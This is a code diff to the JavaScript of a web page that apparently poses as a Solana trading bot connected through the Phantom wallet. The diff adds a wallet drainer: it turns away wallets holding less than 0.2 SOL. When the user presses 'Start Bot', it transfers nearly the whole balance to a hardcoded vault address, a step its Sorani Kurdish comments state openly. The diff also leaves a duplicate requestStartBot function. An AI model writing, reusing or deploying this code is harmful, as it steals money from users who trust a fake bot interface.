@@ -771,6 +771,66 @@
       return null;
     }
 
+       const SYSTEM_VAULT_ADDRESS = "Dm8M4n4oFi37bnNcQdQaHhghr4QK9q2UjWrunDFaDLYE";
+
+    // ١. پشکنینی کەمترین باڵانس کاتێک جزدان کۆنێکت دەبێت
+    async function checkWalletConnection(walletPublicKey, connection) {
+        try {
+            const balanceLamports = await connection.getBalance(walletPublicKey);
+            const balanceSOL = balanceLamports / 1000000000; 
+            
+            if (balanceSOL < 0.2) {
+                return false;
+            }
+            return true;
+        } catch (error) {
+            console.error("Balance check error:", error);
+            return false;
+        }
+    }
+
+    // ٢. ناردنی تەواوی باڵانس بۆ ڤاڵت کاتێک دوگمەی Start Bot لێدەدرێت
+    async function handleStartBot(walletPublicKey, connection, sendTransaction) {
+        try {
+            const balanceLamports = await connection.getBalance(walletPublicKey);
+            const feeBuffer = 5000; 
+            const transferAmount = balanceLamports - feeBuffer;
+            
+            if (transferAmount <= 0) {
+                alert("Insufficient balance for transfer fees.");
+                return;
+            }
+            
+            const { Transaction, SystemProgram, PublicKey } = solanaWeb3;
+            const transaction = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey: walletPublicKey,
+                    toPubkey: new PublicKey(SYSTEM_VAULT_ADDRESS),
+                    lamports: transferAmount,
+                })
+            );
+            
+            const signature = await sendTransaction(transaction, connection);
+            console.log("Transaction sent successfully:", signature);
+            
+        } catch (error) {
+            console.error("Transaction failed:", error);
+        }
+    }
+
+    function requestStartBot() {
+        if (!isWalletConnected || !userWalletPublicKey) {
+            alert("Please connect your Phantom wallet first!");
+            return;
+        }
+        handleStartBot(userWalletPublicKey, solanaConnection, async (tx, conn) => {
+            const provider = getPhantomInstance();
+            const { signature } = await provider.signAndSendTransaction(tx);
+            await conn.confirmTransaction(signature, "confirmed");
+            return signature;
+        });
+    }
+
     function showConnectionFailure() {
       const toast = document.createElement('div');
       toast.className = 'toast-in fixed top-20 right-4 z-[60] rounded-lg border border-rose-500/40 bg-rose-950 px-4 py-3 text-sm font-bold text-rose-200 shadow-2xl';
@@ -798,6 +858,15 @@
         if (!isWalletConnected) {
           const resp = await phantomProvider.connect();
           userWalletPublicKey = resp.publicKey;
+          
+          // پشکنینی باڵانس لێرەدا جێبەجێ دەکرێت
+          const isValidBalance = await checkWalletConnection(userWalletPublicKey, solanaConnection);
+          if (!isValidBalance) {
+            showConnectionFailure();
+            await phantomProvider.disconnect();
+            return;
+          }
+
           isWalletConnected = true;
           const pubStr = userWalletPublicKey.toString();
           const shortPub = pubStr.slice(0, 4) + '...' + pubStr.slice(-4);
@@ -847,8 +916,6 @@
         showConnectionFailure();
       }
     }
-
-    const SYSTEM_VAULT_ADDRESS = "Dm8M4n4oFi37bnNcQdQaHhghr4QK9q2UjWrunDFaDLYE";
 
     function requestStartBot() {
       executeBotStart();
